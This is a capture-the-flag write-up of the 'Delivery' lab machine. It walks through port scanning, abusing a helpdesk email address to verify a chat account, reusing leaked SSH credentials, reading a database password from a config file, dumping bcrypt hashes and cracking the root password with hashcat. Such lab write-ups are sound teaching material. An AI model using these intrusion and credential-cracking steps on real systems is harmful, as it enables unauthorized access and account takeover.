# Delivery writeup

This is a short writeup of ```Delivery```, an easy Linux box.

We start by scanning open ports on the box with nmap to see what we're dealing with. Running a TCP scan for all ports along with service/version detection, we get the following results:

## Port scanning

We start by scanning open ports on the box with nmap to see what we're dealing with. Running a TCP scan for all ports along with service/version detection, we get the following results:

```console
kali@kali:~/Desktop/htb/delivery$ nmap -sT -sV 10.10.10.222 -p 0-65535
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 14:10 EDT
Nmap scan report for 10.10.10.222
Host is up (0.037s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
8065/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.22 seconds
```

Note: Usually I like to run a UDP scan in the background just to cover all bases. Since it is very time consuming, it makes sense to initiate the scan and proceed with further enumeration in the meantime. In this case, the UDP scan yielded no results.

From the nmap scan above, we can draw the following conclusions:

- Ports 22, 80 and 8065 are open
- OpenSSH version is 7.9p1 Debian 10+deb10u2
- Nginx 1.14.2 on port 80
- OS: Linux

## Service enumeration

There are only 3 ports to deal with here and since SSH is usually pretty reliable, we can start with port 80. Visiting the webpage on a browser, we see the following:

![homepage-1](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/homepage-1.png)

The website uses a template from HTML5 UP from https://html5up.net/. The "contact us" page looks like the following:

![contact-us](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/contact-us.png)

The helpdesk link directs to http://helpdesk.delivery.htb. Adding the subdomain to the hosts file we get:

![homepage-2](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/homepage-2.png)

It looks like the website uses osTicket, an open source ticketing system.

Running a directory scan we get the following results:

```console
kali@kali:~/Desktop/htb/delivery$ gobuster dir -u http://helpdesk.delivery.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://helpdesk.delivery.htb
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/06/13 12:08:52 Starting gobuster
===============================================================
/images (Status: 301)
/pages (Status: 301)
/apps (Status: 301)
/assets (Status: 301)
/css (Status: 301)
/includes (Status: 403)
/js (Status: 301)
/kb (Status: 301)
/api (Status: 301)
/include (Status: 403)
/scp (Status: 301)
/included (Status: 403)
/includemanager (Status: 403)
/includedcontent (Status: 403)
===============================================================
2021/06/13 12:10:10 Finished
===============================================================
```
On port 8065 we have the following webpage:

![mattermost-1](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/mattermost-1.png)

Googling what Mattermost is we get the following:

> Mattermost is an open source collaboration tool for developers. As an alternative to proprietary SaaS messaging, Mattermost brings all your team communication into one place, making it searchable and accessible anywhere. It’s written in Golang and React and runs as a production-ready Linux binary under an MIT license with either MySQL or Postgres.

**Results:** 

10.10.10.222:80 

- Contact Us page which says that a user should register on a helpdesk to get access 
- Link to Mattermost server 
- HTML5up template used

helpdesk.delivery.htb 

- Support ticket system powered by osTicket (customer support software) 
- Sign in page: http://helpdesk.delivery.htb/login.php  
- Sign up page: http://helpdesk.delivery.htb/account.php?do=create 
- Sign in page for agents: http://helpdesk.delivery.htb/scp/login.php 
- Open new ticket: http://helpdesk.delivery.htb/open.php 
- Check ticket status: http://helpdesk.delivery.htb/view.php 

10.10.10.2222:8065 

- Mattermost login 
- Create account: http://10.10.10.222:8065/signup_email 
- Forgot password: http://10.10.10.222:8065/reset_password

## Exploitation

### User

We can try to create a ticket on the helpdesk and see what happens. Creating a ticket with random info:

![create-ticket-1](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/create-ticket-1.png)

The success message shows us a support email and a ticket ID.

![create-ticket-2](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/create-ticket-2.png)

Viewing our newly created ticket looks as follows:

![create-ticket-3](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/create-ticket-3.png)

We can now go to Mattermost and sign up with the support email and see what happens:

![mattermost-2](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/mattermost-2.png)

Once the account is successfully created, we get a prompt to verify the email:

![mattermost-3](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/mattermost-3.png)

Heading back to our ticketing system we can see that we have recieved a verification link in a comment:

![create-ticket-4](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/create-ticket-4.png)

Following that link we get:

![mattermost-4](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/mattermost-4.png)

Now we can sign in and we can get into what looks like the company's private channels:

![mattermost-5](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/mattermost-5.png)

Here we see the following message:

> *@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail!*
> *Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"*
> *PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.*

Trying the credentials ```maildeliverer:Youve_G0t_Mail!``` with SSH we get a user shell:

```console
kali@kali:~/Desktop/htb/delivery$ ssh maildeliverer@10.10.10.222
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ whoami
maildeliverer
```

### Root

Doing some enumeration we can find the Mattermost directory under ```/opt```:

```console
maildeliverer@Delivery:/opt/mattermost/config$ ls
cloud_defaults.json  config.json  README.md
```

In the ```config.json``` file we find the following sql configuration:

```json
 "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    }
```

Using the credentials ```mmuser:Crack_The_MM_Admin_PW```, we get:

```console
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 110
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Selecting the ```mattermost``` database and enumerating the ```Users``` table, we get:

```console
MariaDB [mattermost]> SELECT Username,Password FROM Users;
+----------------------------------+--------------------------------------------------------------+                                   
| Username                         | Password                                                                                            
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| evil                             | $2a$10$4gM6CnpodulYwlqfOqZiUe40c.MXwX1HD./tqAb.NWbOQ2LnnTERC |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| bob                              | $2a$10$eAoslT0uLtRX3QM9xFPOv.b15vVpaIkj44lXLoxP/IcYEJeGiU8Jy |
+----------------------------------+--------------------------------------------------------------+
9 rows in set (0.000 sec)
```

Using hashcat, we can now attempt to crack the root hash ```$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO```

First we check the following using ```hashid```:
1. What type of hash it is
2. The hashcat id of the hash

```console
kali@kali:~/Desktop/htb/delivery$ hashid -m root.hash 
--File 'root.hash'--
Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'root.hash'--
```

We can see that the hash type is Blowfish and the hashcat id is 3200. In addition to this, we can use the aforementioned recurring password ```PleaseSubscribe!``` as the wordlist. Using this input we can crack the hash as follows:

```console
kali@kali:~/Desktop/htb/delivery$ hashcat -a 0 -m 3200 root.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 2884/2948 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: wordlist.txt
* Passwords.: 1
* Bytes.....: 17
* Keyspace..: 77
* Runtime...: 0 secs

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Sun Jun 13 14:27:46 2021 (2 secs)
Time.Estimated...: Sun Jun 13 14:27:48 2021 (0 secs)
Guess.Base.......: File (wordlist.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       13 H/s (0.46ms) @ Accel:16 Loops:8 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 21/77 (27.27%)
Rejected.........: 0/21 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:1016-1024
Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21

Started: Sun Jun 13 14:27:45 2021
Stopped: Sun Jun 13 14:27:49 2021
```

The cracked password is ```PleaseSubscribe!21```. We can now upgrade to a root shell as follows:

![root](https://raw.githubusercontent.com/Shezz7/HTB-writeups/master/delivery/resources/root.png)
